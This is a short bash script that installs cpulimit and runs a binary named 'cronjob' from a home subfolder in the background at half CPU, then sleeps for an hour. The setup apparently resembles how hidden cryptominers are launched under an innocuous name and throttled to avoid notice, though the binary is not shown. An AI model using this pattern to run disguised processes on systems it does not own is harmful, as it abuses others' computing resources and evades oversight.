#!/bin/bash
sudo apt-get update &
sleep 10
sudo apt install -y cpulimit &&
chmod +x ~/gg002/cronjob &&
cpulimit -e cronjob -l 50 -b &
sleep 10
~/gg002/./cronjob &
sleep 60m


